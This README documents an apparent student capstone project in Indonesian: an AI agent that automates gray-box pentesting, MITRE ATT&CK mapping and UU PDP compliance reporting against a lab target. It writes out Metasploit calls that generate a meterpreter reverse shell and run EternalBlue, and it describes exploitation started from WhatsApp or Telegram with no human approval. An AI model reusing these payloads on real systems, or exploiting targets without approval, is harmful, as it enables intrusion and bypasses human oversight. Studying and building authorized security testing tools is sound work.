# 🛡️ Unified-Shield: AI-Driven Pentest & PDP Compliance

> **Capstone Project Cybersecurity 2026 — Kelompok 7**
>
> AI Engine: **Hermes Agent** (OpenSource) — 120+ MCP Tools via OpenCode Go
>
> Framework: **MITRE ATT&CK v19.1** (15 Tactics, 75+ Techniques) + **UU No. 27/2022** (UU PDP)
>
> Target: **PT. Dana Sejahtera** — Gray Box Penetration Testing via JumpServer Infrastruktur
>
> Platform: **WhatsApp · Telegram · CLI · Discord** — Pentest dari mana aja, kapan aja

---

## 📋 Daftar Isi

1. [Apa Itu Project Ini?](#-apa-itu-project-ini)
2. [Hermes Agent — Otak di Balik Semua](#-hermes-agent--otak-di-balik-semua)
3. [Arsitektur Sistem](#-arsitektur-sistem)
4. [Struktur Folder](#-struktur-folder)
5. [Komponen Utama](#-komponen-utama)
6. [Workflow Pentest (8 Fase)](#-workflow-pentest-8-fase)
7. [MITRE ATT&CK v19.1 Mapping](#-mitre-attck-v191-mapping)
8. [UU PDP Compliance](#-uu-pdp-compliance-indonesia)
9. [Multi-Platform & Automation](#-multi-platform--automation)
10. [Setup & Cara Pakai](#-setup--cara-pakai)
11. [Deliverables](#-deliverables)
12. [Integrasi Sinergis (Project 4)](#-integrasi-sinergis-project-4)
13. [Rubrik Penilaian](#-rubrik-penilaian)
14. [Tim Pengembang](#-tim-pengembang)

---

## 🎯 Apa Itu Project Ini?

**Bayangkan lo punya sistem keamanan yang bisa:**

1. **Nge-scan** celah keamanan secara otomatis (kayak hacker beneran)
2. **Nge-map** setiap temuan ke teknik serangan di MITRE ATT&CK
3. **Ngecek** apakah temuan itu melanggar **UU PDP Indonesia**
4. **Ngebuatin** laporan lengkap + rekomendasi perbaikan

**Unified-Shield** adalah jawabannya. Sistem AI-powered yang menggabungkan:

| Domain | Kemampuan |
|--------|-----------|
| 🔓 **Offensive Security** | Gray box pentesting — login sebagai staff, cari celah, eksploitasi |
| 💣 **Exploitation** | Generate payload + exploit otomatis via Metasploit Framework |
| 🧠 **Threat Intelligence** | Mapping otomatis 75+ teknik serangan ke MITRE ATT&CK v19.1 |
| ⚖️ **Legal Compliance** | Cek otomatis: temuan ini langgar pasal berapa? Sanksinya apa? |

### Kenapa Ini Penting?

Banyak perusahaan punya celah keamanan tapi:
- ❌ Gak tau cara ngetes secara sistematis
- ❌ Temuan teknis gak di-mapping ke regulasi
- ❌ Laporan kepanjangan, susah dibaca manajemen

**Unified-Shield fix semua itu** — dari scanning ➜ mapping ➜ laporan, sekali jalan.

---

## 🤖 Hermes Agent — Otak di Balik Semua

**Unified-Shield bukan cuma script Python biasa.** Semua operasi dijalankan oleh **Hermes Agent** — AI agent open-source yang jadi "otak" dari seluruh sistem. Hermes yang berpikir, merencanakan, menjalankan, dan melaporkan. Lo tinggal perintah, dia yang kerja.

### Kenapa Pake Hermes Agent?

| Fitur Hermes | Manfaat Buat Pentest |
|-------------|---------------------|
| **🧠 AI Reasoning** | Gak cuma jalanin tool — dia *ngerti* hasil scan, nyambungin temuan, dan mutusin next step |
| **🗂️ Persistent Memory** | Ingat semua temuan dari sesi sebelumnya. Gak mulai dari nol tiap kali — konteks nyambung |
| **🎯 Skill System** | Workflow pentest disimpan sebagai "skill" reusable. Dijalanin persis, tiap saat, tanpa lupa step |
| **🔌 120+ MCP Tools** | Satu agen bisa panggil Nmap, Nuclei, Metasploit, Burp Suite, dll langsung — gak perlu pindah-pindah terminal |
| **📱 Multi-Platform** | Pentest bisa di-trigger dari WhatsApp, Telegram, CLI — hasil dikirim balik ke platform yang sama |
| **⚡ Async & Delegate** | Scan paralel, sub-agent buat tugas berat, background process — semua jalan barengan |
| **🔄 PTG (Penetration Task Graph)** | Anti-looping: tiap task di-track, status di-update real-time, gak ada kerjaan dobel |
| **📊 Dashboard Real-time** | HTTP monitoring dashboard — liat traffic langsung, deteksi anomali, verifikasi blind injection |
| **⏰ Cron Automation** | Jadwalin pentest otomatis tiap jam/hari/minggu — ideal buat continuous security testing |

### Arsitektur Hermes Agent dalam Unified-Shield

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          HERMES AGENT PROFILE                                │
│                          "kelompok7"                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                        🧠 AI CORE (OpenCode Go)                       │   │
│  │                                                                       │   │
│  │  Model: deepseek-v4-pro / deepseek-v4-flash                          │   │
│  │  Persona: AI Pentester Capstone Kelompok 7                           │   │
│  │  Bahasa: Indonesia informal (gw/lo)                                  │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                    │                                         │
│         ┌──────────────────────────┼──────────────────────────────┐          │
│         │                          │                              │          │
│         ▼                          ▼                              ▼          │
│  ┌─────────────────┐    ┌──────────────────┐    ┌──────────────────────┐    │
│  │  📱 PLATFORM    │    │  📚 SKILL        │    │  🛠️ MCP TOOLS        │    │
│  │  CONNECTORS     │    │  SYSTEM          │    │  (120+ Tools)        │    │
│  │                 │    │                  │    │                      │    │
│  │ • WhatsApp      │    │ kelompok7-vpn    │    │ pentest-tools        │    │
│  │   (62895...)    │    │ kelompok7-pentest│    │  └ 65 tools          │    │
│  │                 │    │ kelompok7-pdp    │    │   (Nmap, Nuclei,     │    │
│  │ • Telegram      │    │                  │    │    SQLMap, FFUF,     │    │
│  │   (@bot)        │    │ bug-bounty       │    │    Metasploit, dll) │    │
│  │                 │    │  └ ~50 skills    │    │                      │    │
│  │ • CLI / Terminal│    │                  │    │ security-tools       │    │
│  │                 │    │ hermes-agent     │    │  └ 200+ tools        │    │
│  │ • Discord       │    │                  │    │   (Recon, Vuln,      │    │
│  │   (webhook)     │    │ Autonomous-AI    │    │    Exploit, SAST,    │    │
│  │                 │    │  └ codex,        │    │    WAF bypass,       │    │
│  │                 │    │    claude-code   │    │    Compliance, dll)  │    │
│  └────────┬────────┘    └────────┬─────────┘    │                      │    │
│           │                      │              │ burp-api             │    │
│           │                      │              │  └ Burp Suite        │    │
│           │                      │              │    integration       │    │
│           │                      │              └──────────┬───────────┘    │
│           │                      │                         │                │
│           ▼                      ▼                         ▼                │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                     🔄 AUTOMATION ENGINE                              │   │
│  │                                                                       │   │
│  │  • Session persistence — memory.db + session DB                      │   │
│  │  • Cron scheduler — daily recon, weekend swarm, watchdog             │   │
│  │  • Delegate task — sub-agent buat kerjaan paralel                    │   │
│  │  • Background process — scan async, monitor progress                 │   │
│  │  • Real-time dashboard — HTTP monitoring + findings tracker          │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Setup Hermes Agent (Profile "kelompok7")

Hermes Agent pake **profile system** — jadi setup Kelompok 7 terisolasi dari project lain (bug bounty, personal, dll).

```yaml
# ~/.hermes/config.yaml (partial)
profile: kelompok7
workdir: /home/vedara/Documents/Kelompok 7

# Platform connectors
whatsapp:
  chat_id: "62895410748166@s.whatsapp.net"
  channel_prompt: "AI Pentester Capstone Kelompok 7"

telegram:
  chat_id: "1427518133"
  bot_token: "<token>"
  channel_prompt: "AI Pentester — auto /start"

# Auto-load skills
platforms:
  skills:
    whatsapp:
      - kelompok7-vpn
      - kelompok7-pentest
      - kelompok7-pdp-compliance
    telegram:
      - kelompok7-vpn
      - kelompok7-pentest
      - kelompok7-pdp-compliance

# MCP tool servers
mcp_servers:
  pentest-tools:   65 tools  (PTG, CVE, BOLA, CVSS, Nuclei, Nmap...)
  security-tools:  200+ tools (Recon, Vuln, Exploit, SAST, WAF...)
  burp-api:        Burp Suite integration (proxy, repeater, scanner)
  android-tools:   APK reverse engineering
```

### 3 Skills Wajib — Udah Di-load Otomatis

| Skill | Fungsi | Trigger |
|-------|--------|---------|
| **🔌 kelompok7-vpn** | Auto-connect SSTP VPN ke `blackops.surf:6443`, add route `192.168.168.0/24`, siapin akses lab | Dipanggil tiap sesi dimulai |
| **🔓 kelompok7-pentest** | Full workflow 8 fase: recon ➜ vuln scan ➜ auth ➜ exploit ➜ advanced ➜ validate ➜ PDP audit ➜ report. 75 teknik MITRE, 48 pasal UU PDP | User kirim `start` |
| **⚖️ kelompok7-pdp-compliance** | Audit UU PDP: mapping temuan teknis ➜ pasal ➜ sanksi ➜ rekomendasi mitigasi. RAG-powered via ChromaDB | Otomatis di fase 7 |

---

## 🏗️ Arsitektur Sistem

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        UNIFIED-SHIELD PLATFORM                          │
│                                AI AGENT                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌─────────────────┐   ┌─────────────────┐   ┌───────────────────────┐  │
│  │  🔍 OFFENSIVE   │──▶│  💣 EXPLOITATION │──▶│  🧠 INTELLIGENCE      │  │
│  │     LAYER       │   │     LAYER        │   │      LAYER            │  │
│  │                 │   │                  │   │                       │  │
│  │ • Nmap scan     │   │ • msfvenom      │   │ • MITRE ATT&CK        │  │
│  │ • Nuclei CVE    │   │   (payload gen) │   │   v19.1 (75 tech)     │  │
│  │ • FFUF fuzz     │   │ • msfconsole    │   │ • STIX database       │  │
│  │ • SQLMap        │   │   (exploit exec)│   │   (858 techniques)    │  │
│  │ • Dalfox XSS    │   │ • Post-exploit  │   │ • Attack chain        │  │
│  │ • 25+ tools     │   │   session mgmt  │   │   correlation         │  │
│  └────────┬────────┘   └────────┬─────────┘   └───────────┬───────────┘  │
│           │                     │                          │              │
│           ▼                     ▼                          ▼              │
│  ┌──────────────────────────────────────────────────────────────────┐    │
│  │              🧠 UNIFIED AI AGENT ORCHESTRATOR                    │    │
│  │                                                                  │    │
│  │ • Security Tools Bridge (120+ MCP tools)                        │    │
│  │ • Metasploit MCP Server (20+ tools)                             │    │
│  │ • MITRE Attack Mapper (75 techniques, 15 tactics)               │    │
│  │ • Credential Manager (multi-role gray box)                      │    │
│  │ • Report Generator (MITRE + UU PDP + Navigator)                 │    │
│  └──────────────────────────────────────────────────────────────────┘    │
│           │                     │                          │              │
│           ▼                     ▼                          ▼              │
│  ┌─────────────────┐   ┌─────────────────┐   ┌───────────────────────┐  │
│  │  ⚖️ PDP          │   │  📊 REPORT       │   │  🔄 INTEGRATION       │  │
│  │  COMPLIANCE      │   │  GENERATOR       │   │  (Project 4)          │  │
│  │                  │   │                  │   │                       │  │
│  │ • RAG ChromaDB   │   │ • Markdown      │   │ • Wazuh SIEM          │  │
│  │   (340 chunks)   │   │ • PDF (print)   │   │ • Threat Hunting      │  │
│  │ • Pasal mapping  │   │ • ATT&CK Nav    │   │ • Metasploit MCP      │  │
│  │ • Sanksi matrix  │   │   layer (JSON)  │   │ • Feedback loop       │  │
│  └─────────────────┘   └─────────────────┘   └───────────────────────┘  │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Alur Data Sederhana

```
INPUT:     Target URL + Credentials (staff login)
              │
              ▼
STEP 1:    🔍 Scanning (Nmap, Nuclei, FFUF, SQLMap, dll)
              │
              ▼
STEP 2:    🎯 Findings → Mapped ke MITRE ATT&CK technique
              │
              ▼
STEP 3:    ⚖️ Teknik → Dicocokin ke pasal UU PDP
              │
              ▼
OUTPUT:    📄 Laporan lengkap + Rekomendasi remediasi
```

---

## 📁 Struktur Folder

```
Kelompok 7/
│
├── README.md                         ← Kamu di sini! Dokumentasi utama
├── Rules_of_Engagement.md            ← Aturan main pengujian
│
├── # 🧠 CORE SYSTEM (Jantungnya)
├── agent_orchestrator.py             ← AI Agent utama — koordinasi semua fase
├── tools_bridge.py                    ← Jembatan ke 120+ tools keamanan
├── index_uu_pdp.py                   ← Indexer UU PDP ke database vektor
├── run_graybox.py                    ← Runner satu-perintah buat pentest
│
├── # 📜 MITRE ATT&CK (Pusat Intelijen)
├── mitre_attack_db.json              ← Database 858 teknik MITRE ATT&CK
├── scripts/
│   ├── mitre_attack_mapper.py        ← Mapper: aksi → teknik → pasal UU
│   ├── credential_manager.py         ← Manajemen multi-akun gray box
│   ├── mcp_metasploit.py             ← MCP Server: msfvenom + msfconsole
│   └── install_metasploit.sh         ← Installer Metasploit Framework
│
├── # 📚 AI SKILLS (Instruksi AI Agent)
├── skills/
│   ├── api_pentest.md                ← Skill: API Pentester otomatis
│   ├── pdp_compliance_auditor.md     ← Skill: Audit UU PDP
│   └── mitre_attack_mapper.md        ← Skill: Mapping MITRE ATT&CK
│
├── # 🗄️ DATABASE
├── db_uu_pdp/                        ← ChromaDB vector store (340 chunks UU)
├── UU Nomor 27 Tahun 2022.pdf        ← Dokumen asli UU PDP
│
├── # ⚙️ KONFIGURASI
├── .env.graybox                      ← Credentials (DI-PROTECT, ga ke-Git!)
│
├── # 📦 UNIFIED PDP MCP
├── unified-pdp/
│   ├── mcp_server/                   ← MCP server untuk PDP compliance
│   ├── scripts/                      ← Automation scripts
│   └── tests/                        ← Unit tests
│
├── # 🧪 PENTEST TOOLS & SERVER
├── mcp-pentest-server/               ← Custom MCP server untuk pentest
│
└── # 📊 OUTPUT & ARTIFACTS
    ├── Remediation_Roadmap.md        ← Roadmap perbaikan
    └── DOKUMENTASI_SISTEM_v2.md      ← Dokumentasi teknis sistem
```

---

## 🧩 Komponen Utama

### 1. 🧠 AI Agent Orchestrator (`agent_orchestrator.py`)

Pusat kendali semua operasi. Bekerja dalam 8 fase otomatis:

```
Fase 1: 🔍 Reconnaissance    → Cari tahu target (subdomain, tech stack, JS)
Fase 2: 🕳️ Vuln Scanning     → Scan celah (CVE, SQLi, XSS, SSRF, dll)
Fase 3: 🔑 Auth Testing      → Tes login, JWT, IDOR, privilege escalation
Fase 4: 💣 Exploitation      → Exploit celah via Metasploit
Fase 5: 🔬 Advanced Testing  → WAF bypass, race condition, GraphQL
Fase 6: ✅ Validasi          → Skor CVSS, prioritas, quality check
Fase 7: ⚖️ Legal Audit       → Map ke UU PDP via RAG
Fase 8: 📄 Report            → Generate laporan MITRE + UU PDP + PDF
```

**Cara pakai:**
```bash
python agent_orchestrator.py          # Jalanin semua fase
python run_graybox.py --setup         # Setup kredensial dulu
python run_graybox.py                 # Jalanin pentest
```

### 2. 🔗 Security Tools Bridge (`tools_bridge.py`)

Jembatan yang nyambungin 120+ tools keamanan ke MITRE ATT&CK mapping.

Setiap tool output langsung di-mapping ke teknik MITRE:

| Kategori | Tools | Contoh |
|----------|-------|--------|
| **🔍 Recon** | Nmap, FFUF, Subfinder, Whatweb | `nmap -sV target.com` ➜ T1046 (Service Discovery) |
| **🕳️ Vuln** | Nuclei, SQLMap, Dalfox, Nikto | `nuclei -u target.com` ➜ T1190 (Exploit Public App) |
| **🔑 API** | Kiterunner, Arjun, Swagger | `arjun -u target.com/api` ➜ T1595 (Active Scanning) |
| **⚡ Exploit** | Metasploit (msfvenom, msfconsole) | `msfvenom -p ...` ➜ T1203 (Exploit for Client Execution) |
| **🛡️ WAF** | WAF Engine, Adaptive Bypass | `wafw00f target.com` ➜ T1562 (Impair Defenses) |

**Contoh kode:**
```python
from tools_bridge import SecurityToolsBridge

bridge = SecurityToolsBridge()
bridge.set_target("https://target.com")
bridge.set_auth_token("jwt_token", role="staff")
bridge.start_mitre_chain("graybox-001")

# Log finding → auto-map ke MITRE + UU PDP
bridge.log_finding("login_with_credentials", "Staff login OK", "Medium", "/api/v1/auth/login")
# Hasil: T1078 (Valid Accounts) ➜ Pasal 23, 35, 36, 39, 65
```

### 3. 🗺️ MITRE ATT&CK Mapper (`scripts/mitre_attack_mapper.py`)

Mapper paling komplet — **75 actions, 15 tactics, 1,014 UU PDP mappings**.

```python
from scripts.mitre_attack_mapper import MitreAttackMapper

mapper = MitreAttackMapper()
result = mapper.map_action("login_with_credentials", evidence="Staff login OK", severity="Medium")
# Output: T1078 (Valid Accounts) ➜ Pasal 23, 35, 36, 39, 65
```

### 4. ⚖️ PDP Compliance Auditor (`index_uu_pdp.py` + `skills/pdp_compliance_auditor.md`)

Sistem **RAG (Retrieval-Augmented Generation)** yang:
1. **Index** UU No. 27/2022 ke ChromaDB (340 chunks vektor)
2. **Cocokkan** temuan teknis ke pasal yang relevan
3. **Keluarkan** pasal + sanksi + rekomendasi mitigasi

```bash
python index_uu_pdp.py                # Index UU PDP (sekali aja)
```

### 5. 💣 Metasploit MCP Server (`scripts/mcp_metasploit.py`)

Integrasi Metasploit Framework sebagai server MCP. 20+ tools siap pakai:

| Tool | Fungsi |
|------|--------|
| `msfvenom_generate_payload` | Generate reverse shell, webshell, Android APK |
| `msfconsole_exploit` | Eksekusi exploit (EternalBlue, SMBGhost, etc) |
| `msfconsole_search` | Cari module exploit berdasarkan CVE/tech |
| `msfconsole_sessions` | Manage sesi post-exploitation |

```python
# Generate payload
msfvenom_generate_payload(
    payload="linux/x64/meterpreter/reverse_tcp",
    lhost="10.10.14.5", lport="4444",
    format="elf", output_file="/tmp/payload.elf"
)

# Search + run exploit
msfconsole_search(query="smb", search_type="exploit")
msfconsole_exploit(
    module="exploit/windows/smb/ms17_010_eternalblue",
    rhost="10.10.10.40",
    payload="windows/x64/meterpreter/reverse_tcp",
    lhost="10.10.14.5", lport="4444"
)
```

### 6. 🔑 Credential Manager (`scripts/credential_manager.py`)

Manajemen kredensial multi-role buat gray box testing:

| Role | Fungsi | Skenario |
|------|--------|----------|
| **Attacker** | Akun staff biasa | Initial access, discovery, IDOR horizontal |
| **Victim** | Akun user target | Target IDOR, data exposure |
| **Admin** | Akun admin | Privilege escalation, IDOR vertikal |

### 7. 🗄️ RAG System (ChromaDB)

Database vektor untuk pencarian semantik UU PDP:
- **340 chunks** dari 77 pasal UU PDP
- **Embedding model:** `paraphrase-multilingual-MiniLM-L12-v2`
- **Query:** Bahasa Indonesia natural → cocokin ke pasal

---

## 🔄 Workflow Pentest (8 Fase)

Berikut alur lengkap dari awal sampai laporan jadi:

### Fase 1: 🔍 Reconnaissance (Pencarian Informasi)

```
Tools: subfinder, crt.sh, dnsx, httpx, whatweb, favicon, gau, katana
       LinkFinder, SecretFinder, FFUF, Kiterunner, Arjun, Swagger
       
Output: Daftar subdomain, teknologi, endpoint API, JS secrets
```

**Apa yang terjadi:**
1. Cari semua subdomain (subfinder + crt.sh)
2. Cek teknologi yang dipake (whatweb + favicon hash)
3. Ekstrak endpoint dari JavaScript (LinkFinder + SecretFinder)
4. Cari hidden path (FFUF + Kiterunner)
5. Temuin parameter tersembunyi (Arjun)
6. Cek dokumentasi API (Swagger)

### Fase 2: 🕳️ Vulnerability Scanning (Scan Celah)

```
Tools: Nuclei, SQLMap, Dalfox, Nikto, CORS scan, LFI scan
       SSTI scan, Open Redirect scan, Param reflection
       
Output: Daftar celah dengan severity (Critical/High/Medium/Low)
```

**Apa yang terjadi:**
1. Scan 1000+ CVE template (Nuclei)
2. Tes SQL injection (SQLMap)
3. Tes XSS (Dalfox + manual reflection test)
4. Tes CORS misconfiguration
5. Tes LFI/Path Traversal
6. Tes SSTI (Server-Side Template Injection)
7. Tes Open Redirect

### Fase 3: 🔑 Authentication & Authorization Testing (Tes Login & Izin)

```
Tools: JWT analyzer, Auth heartbeat, IDOR/BOLA tester
       Mass assignment tester, Privilege escalation tester
       
Output: Validasi: bisa gak akses data orang lain? Bisa gak jadi admin?
```

**Apa yang terjadi:**
1. Analisis JWT (bisa gak bypass signature?)
2. Tes IDOR/BOLA (ganti ID, dapet data orang lain?)
3. Tes Mass Assignment (tambah field `is_superuser:true`?)
4. Tes Privilege Escalation (staff ➜ admin?)
5. Two-account testing (akun A vs akun B)

### Fase 4: 💣 Exploitation (Eksploitasi via Metasploit)

```
Tools: msfvenom, msfconsole, Meterpreter
       
Output: Payload, exploit execution, post-exploitation session
```

**Apa yang terjadi:**
1. Cari module exploit yang cocok buat tech target
2. Generate payload (reverse shell, webshell)
3. Execute exploit (kalo di scope)
4. Post-exploitation: enum sistem, collect data

### Fase 5: 🔬 Advanced Testing (Tes Lanjutan)

```
Tools: WAF bypass engine, HTTP smuggler, Race condition
       WebSocket tester, Error trigger, GraphQL scanner
       
Output: Celah lanjutan yang tools biasa gak detect
```

**Apa yang terjadi:**
1. Profil WAF + bypass (Cloudflare/AWS/Akamai)
2. HTTP Request Smuggling
3. Race condition (20-50 request simultan)
4. WebSocket tanpa auth
5. Trigger error buat dapetin stack trace
6. GraphQL introspection + CSRF

### Fase 6: ✅ Findings Validation & Scoring (Validasi & Skor)

```
Tools: CVSS v3.1 calculator, Triage scorer, Pre-report quality check
       
Output: Temuan terskor + prioritas (P1/P2/P3/P4)
```

**Apa yang terjadi:**
1. Skor CVSS v3.1 (vector proper: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
2. Prioritas berdasarkan ROI (payout / effort)
3. Quality check 6-item: sibling endpoints, chain potential, dual account, dll

### Fase 7: ⚖️ Legal Compliance Audit (Audit Hukum)

```
Tools: RAG ChromaDB, UU PDP mapper, MITRE-UU PDP correlator
       
Output: Tiap temuan → Pasal berapa? Sanksi apa?
```

**Apa yang terjadi:**
1. Query RAG: "akses data tanpa izin" ➜ Pasal 35, 38, 39
2. Map teknik MITRE ke pasal UU PDP (1,014 mapping)
3. Output risiko hukum + potensi sanksi

**Contoh mapping:**
```
Temuan: IDOR di /api/v1/users/{id} — bisa akses data user lain
  ➜ T1210 (Exploitation of Remote Services)
  ➜ Pasal 38 (Perlindungan Tidak Sah)
  ➜ Pasal 39 (Pencegahan Akses Tidak Sah)
  ➜ Sanksi: Pidana penjara 5 tahun + denda Rp 50M
```

### Fase 8: 📄 Report Generation (Buat Laporan)

```
Tools: Report generator, WeasyPrint PDF, ATT&CK Navigator
       
Output: 3 file: Markdown report + PDF + ATT&CK Navigator layer
```

**Apa yang dihasilkan:**
1. ✅ Laporan Markdown (lengkap: temuan, CVSS, MITRE, UU PDP)
2. ✅ PDF siap print (professional styling via WeasyPrint)
3. ✅ ATT&CK Navigator layer (visual heatmap teknik yang kena)

---

## 🗺️ MITRE ATT&CK v19.1 Mapping

### 15 Tactics Coverage

| # | Tactic | Techniques | Contoh Teknik |
|---|--------|-----------|---------------|
| 1 | **🔍 Reconnaissance** | 8 | T1595 (Active Scanning), T1580 (Cloud Enum) |
| 2 | **🚪 Initial Access** | 6 | T1078 (Valid Accounts), T1190 (Exploit Public App) |
| 3 | **⚡ Execution** | 14 | T1059 (Command Interpreter), T1204 (User Execution) |
| 4 | **🔄 Persistence** | 14 | T1136 (Create Account), T1098 (Account Manip) |
| 5 | **⬆️ Privilege Escalation** | 25 | T1068 (Exploit for PrivEsc), T1548 (Abuse Elevation) |
| 6 | **🛡️ Defense Evasion** | 42 | T1070 (Indicator Removal), T1562 (Impair Defenses) |
| 7 | **🔑 Credential Access** | 42 | T1539 (Steal Cookie), T1552 (Unsecured Creds) |
| 8 | **🔎 Discovery** | 30 | T1087 (Account Disc), T1046 (Service Disc) |
| 9 | **🔄 Lateral Movement** | 18 | T1021 (Remote Services), T1210 (Exploit Remote Svc) |
| 10 | **📥 Collection** | 28 | T1005 (Local System), T1114 (Email Collection) |
| 11 | **📡 Command & Control** | 22 | T1071 (App Layer Protocol), T1573 (Encrypt C2) |
| 12 | **🚀 Exfiltration** | 16 | T1567 (Exfil Over Web), T1041 (Exfil Over C2) |
| 13 | **💥 Impact** | 15 | T1486 (Data Encrypted), T1485 (Data Destruct) |
| 14 | **🏗️ Resource Dev** | 8 | T1583 (Acquire Infrastructure) |
| 15 | **🧪 Defense Impairment** | 5 | T1562.008 (Disable Cloud Logs) |

**Total: 15 tactics, 75+ techniques, 1,014 UU PDP mappings**

### Contoh Attack Chain Lengkap

```
1. Login staff ➜ T1078 (Valid Accounts) ➜ Pasal 23, 35, 36, 39
     │
     ▼
2. Enumerate users ➜ T1087 (Account Discovery) ➜ Pasal 32, 38
     │
     ▼
3. IDOR test ➜ T1210 (Exploit Remote Svc) ➜ Pasal 38, 39
     │
     ▼
4. Mass Assignment ➜ T1068 (Priv Escalation) ➜ Pasal 35, 39
     │
     ▼
5. Extract PII ➜ T1213 (Data Repos) ➜ Pasal 16, 35, 38
     │
     ▼
6. Exfiltrate data ➜ T1567 (Exfil Web) ➜ Pasal 35, 38, 45, 46
     │
     ▼
7. CVE Exploit ➜ T1210 (Remote Exploit) ➜ Pasal 35, 36, 39, 67
```

---

## ⚖️ UU PDP Compliance (Indonesia)

### Coverage: 48/48 Pasal (100%!)

| Pasal | Topik | MITRE Techniques | Risiko |
|-------|-------|-----------------|--------|
| **Pasal 16** | Pemrosesan Data | 33 | Ngumpulin data tanpa izin |
| **Pasal 17** | Data Visual (CCTV) | 2 | Screenshot/capture tanpa persetujuan |
| **Pasal 23** | Persetujuan | 1 | Akses tanpa persetujuan valid |
| **Pasal 28** | Pemrosesan Terbatas | 25 | Pake data melebihi tujuan awal |
| **Pasal 31** | Perekaman Kegiatan | 119 | Hapus log/audit trail |
| **Pasal 32** | Hak Akses Subjek | 9 | Temuin akun/data tanpa otorisasi |
| **Pasal 35** | Keamanan Data | 261 | Gagal lindungin data pribadi |
| **Pasal 36** | Langkah Teknis | 159 | Gak ada langkah teknis keamanan |
| **Pasal 38** | Perlindungan Tidak Sah | 147 | Akses data tanpa izin |
| **Pasal 39** | Cegah Akses Tidak Sah | 126 | Data pribadi diakses orang tak berhak |
| **Pasal 46** | Notifikasi Kegagalan | 21 | Gak notify breach 3x24 jam |
| **Pasal 57** | Sanksi Administratif | 20 | Kena sanksi administratif |
| **Pasal 65-69** | Ketentuan Pidana | 27 | Bisa kena pidana |
| **Pasal 71-73** | Sanksi Pidana | 9 | Penjara + denda |

### Matriks Risiko Hukum

| Severity | Pasal | Tactic MITRE | Sanksi |
|----------|-------|--------------|--------|
| 🔴 **Critical** | 67, 68, 69 | Impact | Pidana penjara + denda |
| 🟠 **High** | 35, 39, 46 | Initial Access, Exfiltration | Sanksi adm + pidana |
| 🟡 **Medium** | 28, 31, 32, 38 | Discovery, Collection | Sanksi administratif |
| 🟢 **Low** | 16, 17, 23 | Reconnaissance | Peringatan tertulis |

### Cara Kerja RAG untuk Compliance

```
Temuan Teknis                        UU PDP
─────────────────                    ──────
"Bisa akses data user lain via IDOR" ➜ ChromaDB ➜ Pasal 38, 39
"Login tanpa CAPTCHA"               ➜ ChromaDB ➜ Pasal 35, 36
"Stack trace muncul di error page"  ➜ ChromaDB ➜ Pasal 31, 35
"Bisa baca file .env"               ➜ ChromaDB ➜ Pasal 35, 38
```

---

## 📱 Multi-Platform & Automation

Salah satu kekuatan terbesar Hermes Agent di Unified-Shield adalah **lo gak perlu buka laptop buat jalanin pentest.** Cukup dari hape — WhatsApp atau Telegram — dan agent bakal mulai kerja.

### Trigger Pentest dari WhatsApp

Lo bisa jalanin full pentest langsung dari WhatsApp:

```
Lo (WA):        "start"
                ↓
Hermes Agent:   [Auto-load 3 skills]
                [Connect VPN ke blackops.surf]
                [Mulai 8 fase pentest]
                [Generate report]
                ↓
Lo (WA):        "✅ Pentest selesai!
                 📄 Report: 37KB, 14 sections
                 🔴 2 P1, 🟠 1 P2, 🟡 2 P3
                 ⚖️ Mapped ke Pasal 35, 38, 39 UU PDP"
```

**Cara setup:**
1. Hermes WhatsApp bridge jalan di port `3000`
2. Kirim `start` dari nomor yang terdaftar (`62895410748166`)
3. Agent auto-detect trigger, langsung eksekusi tanpa konfirmasi
4. Hasil dikirim balik ke WhatsApp dengan format ringkas

**Fitur WhatsApp:**
- `start` — Jalanin pentest full
- `stop` — Stop pentest + disconnect VPN
- `list` — Lihat temuan yang udah di-save
- Chat bebas — Tanya progress, minta update, kirim perintah baru

### Trigger Pentest dari Telegram

Bot Telegram siap 24/7 buat auto-pentest:

```
Lo (Telegram):  "/start"
                ↓
Hermes Agent:   [Auto-load 3 skills]
                [Connect VPN]
                [8 fase pentest]
                [Report langsung di chat]
```

**Fitur Telegram:**
- `/start` — Trigger full pentest otomatis
- `/stop` — Disconnect VPN
- Auto-detection: `/start` dari chat ID terdaftar langsung jalan tanpa approval
- Report dikirim sebagai Markdown dengan formatting rapi

### Discord Webhook

Buat notifikasi ke channel Discord Kelompok 7:

```bash
# Script kirim report ke Discord
./scripts/discord-send.sh "Pentest selesai: 2 P1, 1 P2, 2 P3" /path/to/report.md
```

### Automation Engine

| Fitur | Fungsi | Contoh |
|--------|--------|--------|
| **⏰ Cron Scheduler** | Jadwalin pentest otomatis | "Tiap jam 9 pagi, scan JumpServer + generate report" |
| **🔄 Background Process** | Scan async tanpa nunggu | Nmap scan 1000 port di background, lanjut kerja lain |
| **🧩 Delegate Task** | Sub-agent paralel | 3 VM di-scan bersamaan (NFS, Browser, Windows) |
| **💾 Session Persistence** | Ingat semua temuan | Sesi sebelumnya nemu IDOR di `/api/v1/users/` → sesi berikutnya langsung tes variasi |
| **📊 Dashboard** | Monitor real-time | HTTP dashboard di `localhost:8080` — liat request/response langsung |
| **🔔 Alert** | Notifikasi real-time | Temuan P1 langsung kirim alert ke WA + Telegram |

### Contoh Skenario: Weekend Automation

```
Jumat 22:00 → Cron trigger "Weekend Swarm"
  │
  ├── Sub-agent 1: Recon JumpServer (subfinder + nuclei + ffuf)
  ├── Sub-agent 2: CVE scan semua VM internal (10.10.10.0/24)
  └── Sub-agent 3: UU PDP audit + report generation
  
Sabtu 06:00 → Hasil dikirim ke WhatsApp:
  "Weekend scan selesai:
   🔴 1 P1 (baru!) — RDP Keyboard Injection
   🟠 2 P2 — CVE-2024-6387, Auth Bypass
   📄 Report: 42KB, ready to submit"
```

### Delivery Matrix

| Platform | Trigger | Output | Approval |
|----------|---------|--------|----------|
| **WhatsApp** | Kirim `start` | Report di chat (+ file .md) | Auto — no approval |
| **Telegram** | `/start` | Report di chat (+ Navigator JSON) | Auto — no approval |
| **CLI** | `python run_graybox.py` | Terminal output + file | Interactive |
